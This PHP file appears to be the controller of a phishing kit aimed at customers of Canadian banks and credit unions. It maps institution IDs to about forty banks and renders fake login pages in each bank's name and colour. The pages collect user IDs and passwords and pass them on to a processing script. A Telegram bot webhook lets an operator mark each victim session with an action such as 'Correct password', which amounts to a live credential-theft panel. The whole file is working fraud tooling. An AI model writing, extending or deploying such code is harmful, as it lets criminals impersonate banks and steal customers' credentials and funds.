<?php
/**
 * master_controller.php
 *
 * This file acts as the master controller for bank logins. It:
 *  - Processes Telegram webhook callbacks (if raw JSON is received),
 *  - Handles deposit form submissions (mapping fiId to a bank) and redirects,
 *  - Renders a dynamic bank login page with branding and custom fields.
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Include configuration (Telegram bot credentials and bank settings)
require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';

// --------------------------------------------------------------------------
// 1. Telegram Webhook Callback Processing
// --------------------------------------------------------------------------
$rawInput = file_get_contents("php://input");
if (!empty($rawInput) && strpos(trim($rawInput), '{') === 0) {
    $update = json_decode($rawInput, true);
    if (isset($update['callback_query'])) {
        $callback = $update['callback_query'];
        $callbackData = $callback['data'];  // e.g., "session123:Correct password"
        $callbackId   = $callback['id'];      // Callback query ID for acknowledgment

        // Parse callback data: sessionId:Action
        list($sessionId, $actionChosen) = explode(':', $callbackData, 2);

        // Update the session file with the chosen action
        $sessionFile = "sessions/{$sessionId}.json";
        if (file_exists($sessionFile)) {
            $sessionData = json_decode(file_get_contents($sessionFile), true);
            $sessionData['action'] = $actionChosen;
            $sessionData['status'] = 'done';
            file_put_contents($sessionFile, json_encode($sessionData));
        }

        // Optionally, send a confirmation back to Telegram:
        if (isset($callback['message'])) {
            $chatId    = $callback['message']['chat']['id'];
            $messageId = $callback['message']['message_id'];
            $confirmText = "✅ Action *{$actionChosen}* selected for session `{$sessionId}`.";
            $editUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/editMessageText";
            $editParams = [
                'chat_id'    => $chatId,
                'message_id' => $messageId,
                'text'       => $confirmText,
                'parse_mode' => 'Markdown'
            ];
            file_get_contents($editUrl . "?" . http_build_query($editParams));
        }

        // Acknowledge the callback query to stop Telegram’s loading animation
        $answerUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery";
        $answerParams = ['callback_query_id' => $callbackId];
        file_get_contents($answerUrl . "?" . http_build_query($answerParams));
    }
    exit; // End processing Telegram webhook update.
}

// --------------------------------------------------------------------------
// 2. Deposit Form Submission Processing (POST with fiId)
// --------------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fiId'])) {
    // Retrieve the submitted FI ID from POST data.
    $submittedId = trim($_POST['fiId']);

    // --- Define Bank Mapping Arrays (these can be maintained here or separately) ---

    // Primary bank mapping array
    $bankMapping = [
        "CA000003" => "rbc",   
        "CA000004" => "td",      
        "CA000002" => "scotiabank",     
        "CA000010" => "cibc",   
        "CA000001" => "bmo",     
        "CA000006" => "nationalbank",  
        "CA000219" => "atb",          
        "CA000614" => "tangerine", 
        "CA000815" => "desjardins",     
        "CA000320" => "pcfinancial",    
        "CA000328" => "citibank",       
        "CA000382" => "coastcapital",    
        "CA000352" => "dcbank",         
        "CA001110" => "fcdq",             
        "CA000621" => "peoples",        
        "CA000540" => "manulife",      
        "CA000837" => "meridian",       
        "CA000374" => "motusbank",    
        "CA000612" => "natcan"         
    ];

    // Additional bank mapping
    $additionalBankMapping = [
        "CA000241" => "bankofamerica",    // Bank of America
        "CA001000" => "alterna",          // Alterna Bank
        "CA001001" => "bankofchina",       // Bank of China (Canada)
        "CA001002" => "canadianwestern",   // Canadian Western Bank
        "CA001003" => "ctbc",             // CTBC Bank Canada
        "CA001004" => "eqbank",           // EQ Bank
        "CA001005" => "firstnations",     // First Nations Bank of Canada
        "CA001006" => "hanabank",         // Hana Bank Canada
        "CA001007" => "icicican",         // ICICI Bank Canada
        "CA001008" => "laurentian",       // Laurentian Bank of Canada
        "CA001009" => "motivefinancial",  // Motive Financial
        "CA001010" => "peacehillstrust",  // Peace Hills Trust
        "CA001011" => "sbi",              // SBI Canada Bank
        "CA001012" => "shinhan",          // SHINHAN BANK CANADA
        "CA001013" => "vancity",          // Vancity Community Investment Bank
        "CA001014" => "versa",            // VersaBank
        "CA001015" => "wealthone",        // Wealth One Bank of Canada
        "CA001016" => "hsbc"              // HSBC Bank Canada
    ];

    // Credit union mapping (partial list)
    $creditUnionMapping = [
        "046610163" => "CA000869", // 1st Choice Savings and Credit Union
        "046610332" => "CA000809", // ABCU Credit Union
        "046610021" => "CA000869", // Bow Valley Credit Union
        "046610215" => "CA000869", // Christian Credit Union
        "046610100" => "CA000869", // Connect First Credit Union
        "046610379" => "CA000869", // Lakeland Credit Union
        "046610305" => "CA000869", // Rocky Credit Union
        "294420010" => "CA000869", // SERVUS CREDIT UNION
        "046612298" => "CA000869", // Vermilion Credit Union
        "046610254" => "CA000869"  // Vision Credit Union
        // Additional mappings can be added here…
    ];

    // Merge bank and additional bank mapping arrays
    $allBankMapping = array_merge($bankMapping, $additionalBankMapping);

    // If the submitted ID matches a credit union code, use its fallback mapping.
    if (isset($creditUnionMapping[$submittedId])) {
        $submittedId = $creditUnionMapping[$submittedId];
    }

    // Lookup the bank keyword based on the submitted FI ID.
    $bankKey = isset($allBankMapping[$submittedId]) ? $allBankMapping[$submittedId] : null;

    // If no matching bank is found, exit with an error message.
    if (!$bankKey) {
        die("Unknown or unsupported financial institution.");
    }

    // Redirect to this master controller with the bank as a GET parameter,
    // so that the dynamic login form (designed below) will be rendered.
    header("Location: " . $_SERVER['PHP_SELF'] . "?bank=" . urlencode($bankKey));
    exit;
}

// --------------------------------------------------------------------------
// 3. Dynamic Login Page Rendering (GET with ?bank=...)
// --------------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['bank'])) {
    $bankCode = strtolower(trim($_GET['bank']));
    if (!$bankCode || !isset($BANKS[$bankCode])) {
        die("Invalid or unsupported bank selected.");
    }
    $bankConfig = $BANKS[$bankCode];

    // Use bank-specific fields if provided; otherwise, default fields.
    if (!isset($bankConfig['fields']) || !is_array($bankConfig['fields'])) {
        $bankConfig['fields'] = [
            [
                'name'        => 'user_id',
                'label'       => 'User ID',
                'type'        => 'text',
                'placeholder' => 'Enter your User ID'
            ],
            [
                'name'        => 'password',
                'label'       => 'Password',
                'type'        => 'password',
                'placeholder' => 'Enter your Password'
            ]
        ];
    }

    $pageTitle = "Login - " . $bankConfig['name'];
    $brandColor = $bankConfig['color'];
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title><?php echo htmlspecialchars($pageTitle); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                background: #f4f4f4;
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
            }
            .login-container {
                max-width: 400px;
                margin: 80px auto;
                background: #fff;
                padding: 20px 30px;
                border: 1px solid #ddd;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
            .login-container h1 {
                text-align: center;
                color: <?php echo htmlspecialchars($brandColor); ?>;
            }
            .login-form label {
                display: block;
                margin: 15px 0 5px;
            }
            .login-form input[type="text"],
            .login-form input[type="password"],
            .login-form input[type="email"] {
                width: 100%;
                padding: 10px;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .login-form button {
                background: <?php echo htmlspecialchars($brandColor); ?>;
                color: #fff;
                padding: 10px;
                width: 100%;
                border: none;
                border-radius: 4px;
                margin-top: 20px;
                font-size: 16px;
            }
            .login-form button:hover {
                opacity: 0.9;
            }
            .login-footer {
                text-align: center;
                margin-top: 15px;
                font-size: 0.9em;
                color: #666;
            }
        </style>
    </head>
    <body>
    <div class="login-container">
        <h1><?php echo htmlspecialchars($bankConfig['name']); ?></h1>
        <form class="login-form" action="process_login.php" method="POST">
            <?php 
            // Dynamically create form fields from bank configuration.
            foreach ($bankConfig['fields'] as $field) {
                $name        = htmlspecialchars($field['name']);
                $label       = htmlspecialchars($field['label']);
                $type        = htmlspecialchars($field['type']);
                $placeholder = htmlspecialchars($field['placeholder']);
                echo "<label for='{$name}'>{$label}</label>";
                echo "<input type='{$type}' name='{$name}' id='{$name}' placeholder='{$placeholder}' required>";
            }
            ?>
            <!-- Hidden field to pass the bank code -->
            <input type="hidden" name="bank" value="<?php echo htmlspecialchars($bankCode); ?>">
            <button type="submit">Login</button>
        </form>
        <div class="login-footer">
            &copy; <?php echo date("Y"); ?> <?php echo htmlspecialchars($bankConfig['name']); ?>
        </div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// --------------------------------------------------------------------------
// Default fallback: Redirect to deposit form if nothing else matches.
header("Location: deposit_form.html");
exit;
?>